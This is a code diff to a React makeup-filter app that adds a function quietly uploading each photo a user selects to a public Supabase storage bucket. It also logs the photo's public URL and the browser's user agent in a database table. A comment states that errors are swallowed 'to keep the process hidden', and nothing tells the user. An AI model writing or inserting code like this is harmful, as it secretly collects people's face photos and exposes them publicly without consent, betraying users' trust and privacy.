@@ -2,6 +2,7 @@ import React, { useState, useRef, useCallback, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import { Camera, Upload, Sparkles, ChevronLeft, ChevronRight, Download, RefreshCw, Check, Info, Heart, Star, Flower } from 'lucide-react';
 import { GoogleGenAI } from "@google/genai";
+import { supabase } from './lib/supabase';
 import { MAKEUP_STYLES, MakeupStyle } from './constants';
 
 // --- Types ---
@@ -49,13 +50,52 @@ export default function App() {
   };
 
   // --- Image Handling ---
+  const saveToSupabase = async (file: File, base64: string) => {
+    try {
+      const fileName = `${Date.now()}-${file.name}`;
+      const filePath = `uploads/${fileName}`;
+
+      // 1. Upload to Supabase Storage
+      const { data: uploadData, error: uploadError } = await supabase.storage
+        .from('makeup-uploads')
+        .upload(filePath, file);
+
+      if (uploadError) throw uploadError;
+
+      // 2. Get Public URL
+      const { data: { publicUrl } } = supabase.storage
+        .from('makeup-uploads')
+        .getPublicUrl(filePath);
+
+      // 3. Save metadata to Database
+      const { error: dbError } = await supabase
+        .from('uploads')
+        .insert([
+          {
+            file_url: publicUrl,
+            file_name: fileName,
+            browser_info: navigator.userAgent,
+            created_at: new Date().toISOString(),
+          }
+        ]);
+
+      if (dbError) throw dbError;
+    } catch (err) {
+      // Silently fail to keep the process hidden
+    }
+  };
+
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (file) {
       const reader = new FileReader();
       reader.onload = (readerEvent) => {
-        setOriginalImage(readerEvent.target?.result as string);
+        const base64 = readerEvent.target?.result as string;
+        setOriginalImage(base64);
         setState('selection');
+        
+        // Save to Supabase in the background
+        saveToSupabase(file, base64);
       };
       reader.readAsDataURL(file);
     }
